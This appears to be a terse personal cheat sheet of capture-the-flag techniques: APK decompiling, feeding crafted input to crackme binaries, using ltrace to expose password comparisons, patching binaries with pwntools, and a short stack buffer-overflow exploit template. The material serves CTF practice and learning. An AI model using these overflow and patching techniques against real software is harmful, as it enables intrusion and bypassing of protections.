Reversing APK's:

	apktool d test.apk
	cd test
	cat * | grep -i "flag"
 

Hex2Raw:

	echo "590595959595995" | xxd -r -p | ./crackme

Raw2Hex:

	echo "fdg#$#423$@#!" | xxd -p | ./crackme2

justno:
	ln -s /home/crack/file .

Gatekeeper:

	quick string compare 
	ltrace ./gatekeeper username password 2>&1 | grep "strcmp"

extracting files:
 
	binwalk -e file.ico


patching binaries using pwntools:

	from pwn import *
	elf = ELF('./binary')
	
	number = 123456789

	elf.asm( elf.symbols['alarm'], 'ret' ) # makes the function return null ( does nothing )
	elf.asm( elf.symbols['calculate_key'], 'mov eax,%s\nret\n' % ( hex(number & 0xFFFFFFFF) ) ) # automaticly return the value we want and hex it into 32 bytes value

	elf.save('./new')


PWNTOOLS:
	checksec file (will show if PIE is enabled `PIE switches the memory locations randomly will need to use readelf`)

	from pwn import *
	elf = ELF('./file')
	p = elf.process()
	address_of_first = int(p.recv().split('\n')[-2].split('0x')[-1],16)
	address_of_second = address_of_first - 144 # this should be calculated from the `readlef -s ./file` difference in memory
	payload = 'A'*22 # this should be calculated when the stack crashes 
	payload += p32(address_of_second)
	p.sendline(payload)
	p.interactive()

	
